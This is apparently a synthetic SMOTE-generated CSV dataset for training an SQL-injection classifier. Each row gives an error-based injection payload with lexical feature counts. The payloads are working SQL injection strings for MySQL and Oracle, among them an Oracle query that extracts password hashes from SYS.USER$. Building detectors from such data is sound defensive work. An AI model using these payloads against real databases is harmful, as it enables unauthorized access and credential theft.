id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000401,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",nearest_attack_euclidean,R000237,0.7877704752281287,294.2997257550078,37.05835618708269,3.9055274396628152,107.0,35.0,114.41643812917314,37.883287625834626,0.3641754738575082,0.11912281855152136,0.38804089255740826,0.12866081503356222,4.0,0.0,0.0,0.0,2.0,2.0,0.0,21.88328762583463,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000402,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",nearest_attack_euclidean,R000144,0.8784121589550278,254.903263225218,35.483877204203004,3.9779885399402244,99.1935702147105,34.7419386021015,91.22581580630451,29.741938602101502,0.3890576594448902,0.13631760803018145,0.357930929938024,0.11669380258690437,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,0.0,2.0,5.0,3.0,0.0,-2.7755575615628914e-17,0.0,0.7419386021015013,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.7419386021015013,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.741938602101502
SMOTE_000403,attack,error,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000131,0.43986997444575543,218.0636889028813,29.0,3.2924375263180212,46.82397171844375,32.0,105.59177374755002,33.64794343688751,0.21477338842153557,0.14680213038511958,0.48413169882237295,0.15429278237097188,0.0,4.0,0.0,0.0,1.0,2.0,0.0,19.647943436887505,2.0,0.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.8239717184437536,0.1760282815562464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000404,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000096,0.3272687017564212,278.4909375342496,36.0,4.000328933303462,108.0,35.0,100.69841914585264,34.79251838839699,0.3884133418606152,0.12587469412149568,0.3608605780777966,0.12485138594009253,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.792518388396992,0.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000405,attack,error,"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,nearest_attack_euclidean,R000083,0.6835546186637974,309.42862797099025,38.73015244766775,3.9945093847634694,101.73015244766775,55.0,115.158780418658,37.5396951046645,0.3288401099698284,0.17777620770209393,0.3720808830640138,0.12130279926406386,0.0,4.0,0.0,0.0,2.0,2.0,0.0,20.5396951046645,2.0,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.7301524476677494,0.26984755233225044,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000406,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000114,0.29776860061663096,324.8628977080978,39.45752651387319,3.9799239147604957,105.74515908323913,63.0,120.6602121109855,35.45752651387319,0.3254677519456812,0.19403023253810261,0.37133348838882224,0.10916852712739392,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.457526513873187,0.0,0.0,6.0,7.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000407,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000202,0.3934266499686461,214.76530722668718,31.0,3.897253676137646,77.0,37.0,76.61224578134974,24.153061445337435,0.3587221459776952,0.17237297923603537,0.35648898315484956,0.11241589163141986,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.153061445337435,0.0,0.0,5.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000408,attack,error,"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000073,0.46375364661245844,229.21994330387952,33.0,3.895205184302187,77.0,45.0,84.0,23.219943303879504,0.33592299915703966,0.19631863587099718,0.36646145362586147,0.10129691134610172,0.2199433038795029,0.0,2.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,4.0,0.21994330387950312,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000409,attack,error,"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000060,0.08776440144319955,185.0,28.117129019974467,3.816846039854692,50.8243064700383,43.234258039948934,66.0,24.941435490012765,0.274725980919126,0.23369869210783206,0.3567567567567568,0.13481857021628524,3.882870980025535,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.058564509987233,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000410,attack,error,"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000147,0.17811622641458494,319.5152262242023,40.0,4.011827558091762,104.36801873157309,63.0,117.14720749262924,35.0,0.32663244464156366,0.1971800368086164,0.3666430536561442,0.10954446489367578,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.9263962536853819,0.07360374631461802,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000411,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,0.07280286112451517,220.69396724243973,42.0,4.386717064026911,122.69396724243973,2.0,71.0,25.0,0.5559385775615239,0.009062478008948494,0.32171796931767155,0.11328097511185617,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.897989080813244,1.0,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,error,"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000230,0.03182513119618704,188.98764986778787,27.98764986778787,3.42636919485337,39.95059947115148,35.04940052884852,84.97529973557573,29.01235013221213,0.2113913459792895,0.18546011917651117,0.44963360945800535,0.153514925386194,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,0.0,5.0123501322121315,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.9876498677878687,0.01235013221213116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000413,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000121,1.2957729478775595,192.70793032147003,31.0,3.6364372766077873,64.0,24.0,80.16634425717604,24.54158606429401,0.33228138051120837,0.12460551769170314,0.4157996537839153,0.12731344801317318,2.9168278714119857,1.0831721285880147,0.0,0.0,0.0,0.0,0.0,16.54158606429401,0.0,0.0,4.0,0.0,0.7292069678529964,0.2707930321470037,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000414,attack,error,1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000284,0.06690727386526839,348.7073934440742,32.05852131118516,3.5826514299080605,93.82443606644453,52.92197158508646,143.9804928962716,57.98049289627161,0.26905129457514343,0.1517618879489666,0.4129105173451273,0.16627630013076272,0.0,0.0,2.0,0.0,0.0,2.980492896271614,0.0,29.019507103728387,0.0,2.9414786888148434,0.019507103728385822,24.980492896271613,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.9804928962716144,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.980492896271614
SMOTE_000415,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000127,0.36310774386730577,248.83007667728768,34.0,3.9290628909713465,94.77183909380574,34.257279697935246,90.54367818761146,29.257279697935243,0.3809092595838659,0.13769049063086092,0.36381114184736035,0.11758910793791287,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.257279697935243,0.0,2.0,5.0,3.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.25727969793524397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.257279697935244
SMOTE_000416,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000236,0.058514041782014796,296.4509799104942,38.97347176997093,3.986873106471596,102.23875407026165,55.0,108.15916938017443,31.053056460058144,0.34486088478895427,0.1855430889487395,0.36484768485232555,0.10474834140998067,0.026528230029071898,0.0,0.0,0.0,2.0,1.0,0.0,20.026528230029072,0.0,0.0,6.0,4.0,0.026528230029071787,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000417,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000236,0.9288946373647655,303.15918449074593,38.57887150054436,3.98518746177629,105.79015649510077,55.0,110.52677099673386,31.842256998911285,0.34882187963575845,0.18156079843071599,0.364592136797693,0.10502518513583257,0.42112849945564257,0.0,0.0,0.0,2.0,1.0,0.0,20.42112849945564,0.0,0.0,6.0,4.0,0.42112849945564257,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000418,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.13220859994154266,209.60274911074202,41.69862544462899,4.224843017887705,113.60274911074202,2.0,71.0,23.0,0.5419696725887018,0.009542298487735384,0.338751596314606,0.10973643260895688,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,3.150687277685507,1.0,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000419,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000091,0.19354874689573967,188.0,27.0,3.3877577199678552,38.35724961126742,35.85700051831011,84.57149974084496,29.214250129577525,0.2040279234641884,0.19072872616122397,0.4498484028768348,0.1553949474977528,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.0,0.0,5.214250129577527,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000301,1.4346070557229285,213.0,35.11543092997806,3.665823617898698,55.0,40.0,91.0,27.0,0.25821596244131456,0.18779342723004694,0.4272300469483568,0.1267605633802817,0.442284535010969,0.557715464989031,2.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,5.0,0.442284535010969,0.557715464989031,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000421,attack,error,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",nearest_attack_euclidean,R000155,0.2545561832212088,271.3399816646078,36.0,3.9729985077048693,100.0,35.0,99.67198533168624,36.66799633292156,0.36865137218859684,0.1290279802660089,0.3672032890505873,0.13511735849480697,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.66799633292156,2.0,2.0,5.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000422,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000023,0.06719678048046482,346.66575811657196,39.0,3.8401383304602126,110.14855194819026,55.0,140.6286201295244,40.88858603885731,0.31775586287535684,0.15865818003503013,0.4056431227129267,0.11794283437668637,4.0,0.0,0.0,0.0,2.0,1.9628620129524375,0.0,25.925724025904874,0.0,0.0,6.0,4.962862012952438,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000423,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000091,0.7913156267471286,188.59684489685645,27.477475917485165,3.385014707496828,40.55179673182679,33.68694122691579,85.35810693811388,29.0,0.21484568500181994,0.1787910753850235,0.4525849489618733,0.1537782906512833,4.0,0.0,0.0,0.0,0.0,1.8806310206287082,0.0,16.238737958742583,2.0,0.0,4.880631020628709,1.8806310206287078,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8806310206287085,0.0,0.0,1.1102230246251565e-16,1.0,0.8806310206287085,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11936897937129166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8806310206287087
SMOTE_000424,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000307,0.2745670742851461,214.8254955464364,38.0,3.773373234758086,63.0,37.0,90.35457962203034,24.470915924406064,0.2934442366744123,0.172340265983385,0.4203377409767531,0.11387775636544965,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.470915924406068,0.0,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000425,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000173,0.2180865814879665,325.8853676682547,40.0,4.005851688129922,106.8656103004764,63.0,120.73122060095281,35.288536766825466,0.32794848990414266,0.19348954549021824,0.37026955551320123,0.10829240909243792,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.28853676682547,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000426,attack,error,"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000225,0.19033634028245494,331.92048272963683,40.0,3.9911785144792264,108.61445811772744,63.0,124.38313298836391,35.92289162354549,0.3272264295863841,0.1898294180202103,0.37471191828744643,0.10823223410595914,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.92289162354549,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.0771083764545124,0.9228916235454875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
